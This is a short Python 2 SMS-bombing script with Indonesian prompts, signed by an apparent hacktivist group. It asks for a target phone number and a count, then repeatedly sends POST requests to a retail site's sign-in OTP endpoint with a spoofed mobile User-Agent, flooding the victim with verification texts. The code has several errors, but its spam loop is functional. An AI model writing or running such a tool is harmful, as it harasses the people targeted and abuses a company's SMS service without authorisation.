#!/bin/python2

# By Rendi-ID
# Recode? Silahkan
# Muslim Cyber Army


import os
import sys
import requests
from requests import post
import subprocess

def lagi():
    f = input('Mau Spam Lagi? (y/t) : ')
    if f == 'y':
       subprocess.call('python2 spamsms.py',shel=True)
    elif f == 't':
	 print ("exit")
         sys.exit
def bersih():
    os.system('clear')
no = input("Masukan Nomor Target Ente : ")
jml = int(input("Masukan Jumlah Spam : "))
head = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; A1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
}

dat = {
'phone': no,
}
for x in range(jml):
    requests.post('https://cmsapi.mapclub.com/api/signin-otp',headers=head, data=dat)
    print ["Spam Berhasil"]

bersih()
lagi()
